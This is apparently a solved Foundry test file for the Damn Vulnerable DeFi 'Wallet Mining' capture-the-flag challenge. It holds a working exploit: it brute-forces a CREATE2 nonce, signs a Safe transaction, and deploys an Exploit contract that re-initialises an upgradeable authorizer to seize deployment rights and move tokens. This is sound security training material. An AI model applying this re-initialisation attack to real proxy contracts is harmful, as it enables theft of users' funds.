// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {Create2} from "@openzeppelin/contracts/utils/Create2.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {
    AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
} from "../../src/wallet-mining/AuthorizerFactory.sol";

contract WalletMiningChallenge is Test {
    address deployer = makeAddr("deployer");
    address upgrader = makeAddr("upgrader");
    address ward = makeAddr("ward");
    address player = makeAddr("player");
    address user;
    uint256 userPrivateKey;

    address constant USER_DEPOSIT_ADDRESS = 0x8be6a88D3871f793aD5D5e24eF39e1bf5be31d2b;
    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;

    address constant SAFE_SINGLETON_FACTORY_ADDRESS = 0x914d7Fec6aaC8cd542e72Bca78B30650d45643d7;
    bytes constant SAFE_SINGLETON_FACTORY_CODE =
        hex"7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe03601600081602082378035828234f58015156039578182fd5b8082525050506014600cf3";

    DamnValuableToken token;
    AuthorizerUpgradeable authorizer;
    WalletDeployer walletDeployer;
    SafeProxyFactory proxyFactory;
    Safe singletonCopy;

    uint256 initialWalletDeployerTokenBalance;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Player should be able to use the user's private key
        (user, userPrivateKey) = makeAddrAndKey("user");

        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy authorizer with a ward authorized to deploy at DEPOSIT_ADDRESS
        address[] memory wards = new address[](1);
        wards[0] = ward;
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;
        AuthorizerFactory authorizerFactory = new AuthorizerFactory();
        authorizer = AuthorizerUpgradeable(authorizerFactory.deployWithProxy(wards, aims, upgrader));

        // Send big bag full of DVT tokens to the deposit address
        token.transfer(USER_DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Include Safe singleton factory in this chain
        vm.etch(SAFE_SINGLETON_FACTORY_ADDRESS, SAFE_SINGLETON_FACTORY_CODE);

        // Call singleton factory to deploy copy and factory contracts
        (bool success, bytes memory returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(Safe).creationCode));
        singletonCopy = Safe(payable(address(uint160(bytes20(returndata)))));

        (success, returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(SafeProxyFactory).creationCode));
        proxyFactory = SafeProxyFactory(address(uint160(bytes20(returndata))));

        // Deploy wallet deployer
        walletDeployer = new WalletDeployer(address(token), address(proxyFactory), address(singletonCopy));

        // Set authorizer in wallet deployer
        walletDeployer.rule(address(authorizer));

        // Fund wallet deployer with tokens
        initialWalletDeployerTokenBalance = walletDeployer.pay();
        token.transfer(address(walletDeployer), initialWalletDeployerTokenBalance);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Check initialization of authorizer
        assertNotEq(address(authorizer), address(0));
        assertEq(TransparentProxy(payable(address(authorizer))).upgrader(), upgrader);
        assertTrue(authorizer.can(ward, USER_DEPOSIT_ADDRESS));
        assertFalse(authorizer.can(player, USER_DEPOSIT_ADDRESS));

        // Check initialization of wallet deployer
        assertEq(walletDeployer.chief(), deployer);
        assertEq(walletDeployer.gem(), address(token));
        assertEq(walletDeployer.mom(), address(authorizer));

        // Ensure DEPOSIT_ADDRESS starts empty
        assertEq(USER_DEPOSIT_ADDRESS.code, hex"");

        // Factory and copy are deployed correctly
        assertEq(address(walletDeployer.cook()).code, type(SafeProxyFactory).runtimeCode, "bad cook code");
        assertEq(walletDeployer.cpy().code, type(Safe).runtimeCode, "no copy code");

        // Ensure initial token balances are set correctly
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), DEPOSIT_TOKEN_AMOUNT);
        assertGt(initialWalletDeployerTokenBalance, 0);
        assertEq(token.balanceOf(address(walletDeployer)), initialWalletDeployerTokenBalance);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_walletMining() public checkSolvedByPlayer {
        // Step 1: Find the nonce used to get desired address using a while loop
        // The proxyFactory uses createProxyWithNonce in the drop function of the walletDeployer
        // the salt is calculated using keccak256(abi.encodePacked(keccak256(initializer), saltNonce))
        address target;
        uint256 nonce;

        address[] memory owners = new address[](1);
        owners[0] = user;
        // this is the initializer that we need to construct (otherwise it will take too long to find the nonce)
        // seting the original user to be the wallet owner
        bytes memory initializer = abi.encodeWithSelector(
            Safe.setup.selector, owners, 1, address(0), "", address(0), address(0), 0, payable(address(0))
        );

        bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), nonce));
        // creation code hash of the SafeProxy contract
        bytes32 bytecode =
            keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy)))));
        while (true) {
            target = vm.computeCreate2Address(salt, bytecode, address(proxyFactory));
            if (target == USER_DEPOSIT_ADDRESS) {
                break;
            }
            nonce++;
            salt = keccak256(abi.encodePacked(keccak256(initializer), nonce));
        }
        console.log("Nonce: %d", nonce);

        // Step 2: Create a tx to be executed by the wallet (isn't deployed yet)
        // a Safe can use the execTransaction function to execute a transaction which we will use the user's private key to sign
        bytes memory execData;
        // avoid stack too deep error
        {
            // we will create a token.transfer call to send the tokens from the user's deposit address to the user address
            address to = address(token);
            uint256 value = 0; // this is ether value
            bytes memory data = abi.encodeWithSelector(token.transfer.selector, user, DEPOSIT_TOKEN_AMOUNT);
            Enum.Operation operation = Enum.Operation.Call;
            uint256 safeTxGas = 100000;
            uint256 baseGas = 100000;
            uint256 gasPrice = 0;
            address gasToken = address(0);
            address refundReceiver = address(0);
            bytes memory signatures;

            uint256 nonce; // this is the nonce of the safe (by default it is 0)
            { // avoid stack too deep error
                bytes32 safeTxHash = keccak256(
                    abi.encode(
                        0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8, // SAFE_TX_TYPEHASH
                        to,
                        value,
                        keccak256(data),
                        operation,
                        safeTxGas,
                        baseGas,
                        gasPrice,
                        gasToken,
                        refundReceiver,
                        nonce
                    )
                );

                bytes32 domainSeparator = keccak256(
                    abi.encode(
                        0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218, //DOMAIN_SEPARATOR_TYPEHASH 
                        singletonCopy.getChainId(), // chainId
                        USER_DEPOSIT_ADDRESS // the landing safe address
                    )
                );
                // this is the digest that we will sign (digest also means the hash of the message)
                bytes32 digest = keccak256(
                    abi.encodePacked("\x19\x01", domainSeparator, safeTxHash)
                );
                // step 3: sign the digest with the user's private key
                (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, digest);
                signatures = abi.encodePacked(r, s, v);
            }
            // step 5: Encode the transaction data to be executed in our contract
            execData = abi.encodeWithSelector(
                singletonCopy.execTransaction.selector,
                to,
                value,
                data,
                operation,
                safeTxGas,
                baseGas,
                gasPrice,
                gasToken,
                refundReceiver,
                signatures
            );
        }
        Exploit exploit = new Exploit(token, authorizer, walletDeployer, target, ward, initializer, nonce, execData);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Factory account must have code
        assertNotEq(address(walletDeployer.cook()).code.length, 0, "No code at factory address");

        // Safe copy account must have code
        assertNotEq(walletDeployer.cpy().code.length, 0, "No code at copy address");

        // Deposit account must have code
        assertNotEq(USER_DEPOSIT_ADDRESS.code.length, 0, "No code at user's deposit address");

        // The deposit address and the wallet deployer must not hold tokens
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), 0, "User's deposit address still has tokens");
        assertEq(token.balanceOf(address(walletDeployer)), 0, "Wallet deployer contract still has tokens");

        // User account didn't execute any transactions
        assertEq(vm.getNonce(user), 0, "User executed a tx");

        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // Player recovered all tokens for the user
        assertEq(token.balanceOf(user), DEPOSIT_TOKEN_AMOUNT, "Not enough tokens in user's account");

        // Player sent payment to ward
        assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
    }
}

contract Exploit {
    constructor(
        DamnValuableToken token,
        AuthorizerUpgradeable authorizer,
        WalletDeployer walletDeployer,
        address safe, // the address of the safe that we want to exploit
        address ward, // the address that we want to send the reward to
        bytes memory initializer, // the initializer of the safe
        uint256 nonce, // the nonce used with initializer to calculate the salt that lands the safe at the deposit address
        bytes memory execData // the data that will be executed by the safe
    ) {
        // Change the ward to this contract so we can get the reward
        address[] memory wards = new address[](1);
        wards[0] = address(this);
        address[] memory aims = new address[](1);
        aims[0] = safe;

        authorizer.init(wards, aims); // this will authorize this contract to deploy a safe at the deposit address

        // create the safe by calling the walletDeployer.drop function
        bool success = walletDeployer.drop(safe, initializer, nonce);
        require(success, "Failed to deploy safe");

        // transfer the reward receive from the wallet deployer to the original ward
        token.transfer(ward, token.balanceOf(address(this)));

        // execute the transaction that will transfer the tokens from the user's deposit address to the user's address
        (success, ) = safe.call(execData);
        require(success, "Failed to execute transaction");
    }
}